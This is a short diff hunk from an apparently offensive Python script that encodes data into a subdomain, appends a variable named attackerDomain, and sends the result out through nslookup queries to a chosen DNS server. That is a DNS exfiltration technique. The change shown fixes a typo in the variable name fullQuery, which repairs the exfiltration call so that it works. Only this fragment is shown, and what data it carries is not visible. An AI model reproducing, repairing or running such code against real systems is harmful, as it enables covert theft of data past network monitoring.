@@ -76,7 +76,7 @@ if (lenOfData != 0):
     subdomain = dataEncoded
     fullQuery = subdomain + "." + attackerDomain
     try:
-        subprocess.run(["nslookup", fullQuer, dnsServer])
+        subprocess.run(["nslookup", fullQuery, dnsServer])
     except:
         logError = logError + "Error querying domain: " + fullQuery + "\n"
     print(fullQuery)
